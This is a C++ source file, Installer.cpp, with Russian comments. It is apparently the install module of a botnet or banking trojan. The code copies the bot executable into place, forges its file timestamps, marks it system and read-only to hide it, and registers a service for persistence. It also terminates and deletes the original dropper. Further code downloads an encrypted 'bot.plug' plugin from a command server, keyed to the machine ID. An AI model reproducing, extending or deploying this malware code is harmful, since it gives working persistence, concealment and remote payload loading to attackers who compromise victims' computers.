
//****************************************************************************
//  Installer.cpp
//
//  Модуль реализации методов инсталяции бота
//
//  ВерсияЖ 1.0
//  Модифицирован: ноябрь 2012
//****************************************************************************

#include <ShlObj.h>
#include "Installer.h"
#include "StrConsts.h"
#include "BotUtils.h"
#include "BotCore.h"
#include "Crypt.h"
#include "Plugins.h"
#include "MD5.h"

//---------------------------------------------------------------------------
#include "BotDebug.h"

namespace INSTALLERDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// Объявляем шаблон вывода отладочных строк
#define INSTDBG INSTALLERDEBUGSTRINGS::DBGOutMessage<>

//---------------------------------------------------------------------------


//----------------------------------------------------
//  Install - Функция инсталирует бота
//
//  IsUpdate - Признак того, что идёт обновление бота
//             а не первая инсталяция
//
//  DeleteSourceFile - Удалять ли исходный файл
//
//  SourceFileProcessPID - PID процесса, котрый
//                         необходимо завершить перед
//                         удалением исходного файла
//----------------------------------------------------
BOOL WINAPI Install(const char* FileName, BOOL IsUpdate, BOOL DeleteSourceFile, DWORD SourceFileProcessPID)
{
	if (!File::IsExists((PCHAR)FileName))
		return FALSE;

	string BotFile = BOT::GetBotFullExeName();

	// Проверяем не пытаемся ли мы запустить инсталяцию из
	// самого себя
	if (StrSame((PCHAR)FileName, BotFile.t_str(), false, 0))
		return FALSE;

	INSTDBG("Installer", "Инсталируем бот. Exe бота %s", BotFile.t_str());

	// Снимаем защиту и удаляем файл
	if (IsUpdate) BOT::Unprotect();
	BOT::DeleteBotFile(BotFile.t_str(), INFINITE, false);

	//  Копируем файл
	BOOL Result = (BOOL)pCopyFileA(FileName, BotFile.t_str(), TRUE);
	INSTDBG("Installer", "Копируем файл бота. [Result=%d; Err=%d]", Result, pGetLastError());

	if (Result)
	{
		// Устанавливаем дату и атрибуты файла
		SetFakeFileDateTime(BotFile.t_str());
		pSetFileAttributesA(BotFile.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
    }

	// Инсталируем сервис
	if (IsUpdate)
	{
		// Обновляем сервис
		// В случае неудачи пытаемся установить сервис заново
		if (!BOT::UpdateService(FileName))
			BOT::InstallService(FileName);
	}
	else
		BOT::InstallService(FileName);


	// Ставим защиту на ехе бота
	if (IsUpdate) BOT::Protect(NULL);

	// Удаляем файл источник
	if (DeleteSourceFile)
	{
		DWORD Start = (DWORD)pGetTickCount();

		while ((DWORD)pGetTickCount() - Start < 5000)
		{
			if (SourceFileProcessPID)
				pWinStationTerminateProcess(NULL, SourceFileProcessPID, DBG_TERMINATE_PROCESS);

			pSetFileAttributesA(FileName, FILE_ATTRIBUTE_ARCHIVE );
			BOOL Deleted = (BOOL)pDeleteFileA(FileName);
			if (Deleted || pGetLastError() != 5) break;
			pSleep(50);
        }
	}
	
	INSTDBG("Installer", "Установка бота завершена. [Result=%d]", Result);

	return Result != FALSE;
}
//----------------------------------------------------------------------------

//----------------------------------------------------
//  MakeUpdate - функция обновляет бота
//----------------------------------------------------
bool BOT::MakeUpdate(const char *FileName, bool ResetSettings)
{
	// При необходимости удалем сохранённые настройки
	if (ResetSettings)
		DeleteSettings();

	return Install(FileName, true, true, 0) == TRUE;
}






//**************************************************************
//        Методы для работы с плагином бота bot.plug
//**************************************************************


//----------------------------------------------
//  CryptBotPlug - Функция шифрует/дешифрует
//                 плагина бота
//----------------------------------------------
BOOL WINAPI CryptBotPlug(LPVOID Buf, DWORD BufSize)
{
	if (!Buf || !BufSize) return FALSE;

	// Получаем пароль
	PCHAR Pass = MakeMachineID();
	if (!Pass) return FALSE;

    XORCrypt::Crypt(Pass, (LPBYTE)Buf, BufSize);

	return TRUE;
}


//----------------------------------------------
//  DownloadBotPlug - Функци загружает плагин
//  бота
//----------------------------------------------
/*
bool DoDownloadBotPlug(LPBYTE *Buf, DWORD *BufSize)
{
	// Скачивание плагина bot.plug организовываем вне
	// системы загрузки плагинов
	if (Buf)     *Buf = NULL;
	if (BufSize) *BufSize = 0;

	string PluginName = GetStr(EStrBotPlug);

	PCHAR URL = GetBotScriptURL(SCRIPT_PLUGIN);
	if (STRA::IsEmpty(URL)) return false;

	#ifdef CryptHTTPH
		TCryptHTTP HTTP;
		HTTP.Password = GetMainPassword();
	#else
		THTTP HTTP;
	#endif
	HTTP.CheckOkCode = false;

	TBotStrings Fields;
	Fields.AddValue("name", PluginName.t_str());

	// Плучаем адрес плагина
	bool Result = false;
	string Doc;
	if (HTTP.Post(URL, &Fields, Doc) && HTTP.Response.Code == 302)
	{
		// Получаем адес и загужаем плагин
		string PlugURL = HTTP.Response.Location;
		string MD5     = HTTP.Response.MD5;

		TBotMemoryStream Stream;
		HTTP.CheckOkCode = true;
		if (HTTP.Get(PlugURL.t_str(), &Stream))
		{
			if (!MD5.IsEmpty())
			{
				// проверяем мд5 хэш загруженного документа
				string PlugMD5 = MD5StrFromBuf(Stream.Memory(), Stream.Size());
				Result = PlugMD5 == MD5;
			}
			else
				Result = true;

			if (Result)
			{
				// Кэшируем  плагин
				Plugin::SaveToCache(PluginName.t_str(), Stream.Memory(), Stream.Size());

				// Копиуем файл
				if (BufSize) *BufSize = Stream.Size();
				if (Buf)
				{
					*Buf = (LPBYTE)MemAlloc(Stream.Size());
					m_memcpy(*Buf, Stream.Memory(), Stream.Size());
				}
            }
		}

	}
	STR::Free(URL);
	return Result;
}


bool DownloadBotPlug(LPBYTE *Buf, DWORD *BufSize)
{
	bool Result = false;
	while (!Result)
	{
		Result = DoDownloadBotPlug(Buf, BufSize);
		if (!Result) pSleep(30000);
	}
	return Result;
}    */



//----------------------------------------------
//  LoadBotPlug - Функция загружает плагин
//
//  Если плагин есть на диске, то он загружается
//  с диска. В противном случае плагин загру-
//  жается с админки и промежуточно сохраняется
//  на диске
//----------------------------------------------
BOOL WINAPI LoadBotPlug(LPVOID *Buf, DWORD *BufSize)
{
	if (BufSize) *BufSize = 0;

	if (!Buf) return FALSE;

#ifdef DEBUGCONFIG
	// Заглушка на время тестов
/*	DWORD Sz = 0;
	*Buf = File::ReadToBufferA("c:\\bot.plug", Sz);
	if (BufSize) *BufSize = Sz;
	return *Buf != NULL; 
*/
#endif

	*Buf = Plugin::DownloadEx(GetStr(EStrBotPlug).t_str(), NULL, BufSize,
	                          true, true, NULL);


	return *Buf != NULL;
}




//----------------------------------------------
//  DeleteBotPlug
//  Функция обновляет плагин
//----------------------------------------------
BOOL WINAPI DeleteBotPlug()
{
	return Plugin::DeleteFromCache(GetStr(EStrBotPlug).t_str());
}

//----------------------------------------------
//  UpdateBotPlug - Функция обновляет плагин
//----------------------------------------------
BOOL WINAPI UpdateBotPlug()
{
	DeleteBotPlug();
	LPVOID Buf;
	LoadBotPlug(&Buf, NULL);
	BOOL Result = Buf != NULL;
	MemFree(Buf);
	return Result;
}



//----------------------------------------------
//  FreeBotPlug - Функция освобождает память
//                выделенную под плагин
//
//  Добавлено для dll ядра
//----------------------------------------------
VOID WINAPI FreeBotPlug(LPVOID Buf)
{
    MemFree(Buf);
}



